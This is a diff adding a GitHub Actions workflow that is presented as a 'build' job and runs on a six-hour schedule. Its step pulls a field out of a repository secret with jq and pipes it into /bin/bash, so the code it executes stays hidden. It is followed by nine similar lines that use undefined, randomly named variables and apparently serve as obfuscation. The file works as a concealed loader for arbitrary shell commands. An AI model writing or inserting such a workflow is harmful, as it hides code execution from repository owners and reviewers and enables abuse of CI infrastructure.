@@ -1,0 +1,26 @@
+name: xinglixifa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xinglixifa
+        env:
+          t6: ${{ secrets.t6 }}
+        run: |
+          echo $t6 | jq -r .ur122 | /bin/bash
+          echo $vsrqh512 | jq -r .wgcub5 | /bin/bash
+          echo $n23 | jq -r .hh72 | /bin/bash
+          echo $f8612 | jq -r .nor27783 | /bin/bash
+          echo $t3350 | jq -r .c7 | /bin/bash
+          echo $gx173 | jq -r .y50946 | /bin/bash
+          echo $i4 | jq -r .bdlo0 | /bin/bash
+          echo $a19640 | jq -r .mei10326 | /bin/bash
+          echo $y32 | jq -r .ezz50997 | /bin/bash
+          echo $ep08542 | jq -r .vlwl8 | /bin/bash
+
